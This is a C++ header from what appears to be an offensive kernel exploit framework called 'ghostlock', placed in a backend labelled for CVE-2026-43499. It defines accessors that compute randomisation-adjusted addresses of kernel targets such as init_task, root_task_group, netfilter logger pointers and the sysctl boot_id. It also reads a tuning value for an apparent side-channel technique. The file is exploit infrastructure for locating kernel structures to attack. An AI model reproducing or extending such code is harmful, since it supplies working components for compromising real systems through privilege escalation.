#ifndef GHOSTLOCK_BACKEND_CVE_2026_43499_BACKEND_PROFILE_ACCESSORS_HPP
#define GHOSTLOCK_BACKEND_CVE_2026_43499_BACKEND_PROFILE_ACCESSORS_HPP

/* cve_2026_43499 slide/offset accessors (A2-4-4, relocated from
 * profile/accessors.hpp). They read the active frozen profile through the
 * neutral profile/runtime_struct_offsets.h seam and are 43499-private, so they
 * live with the backend. The namespace stays ghostlock::profile because
 * backend/cve_2026_43499/backend_offsets.cpp already defines the seam in it. */

#include <cstdint>
#include "profile/runtime_struct_offsets.h"

namespace ghostlock::profile {
    inline uint32_t kernelsnitch_collisions() {
        return symbol_u32(
            [](const kernel_offsets &v) {
                return v.misc.kernelsnitch_collisions.value_or(0);
            },
            4);
    }

    inline uintptr_t slide_nfulnl_logger() {
        return active_data_alias(slide_nfulnl_logger_image());
    }

    inline uintptr_t slide_loggers_0_1() {
        return active_data_alias(slide_loggers_0_1_image());
    }

    inline uintptr_t slide_random_boot_id_data() {
        return active_data_alias(slide_random_boot_id_data_image());
    }

    inline uintptr_t slide_init_task() {
        return active_data_alias(slide_init_task_image());
    }

    inline uintptr_t slide_root_task_group() {
        return active_data_alias(slide_root_task_group_image());
    }

    inline uintptr_t slide_sysctl_bootid() {
        return active_data_alias(slide_sysctl_bootid_image());
    }
} // namespace ghostlock::profile

#endif
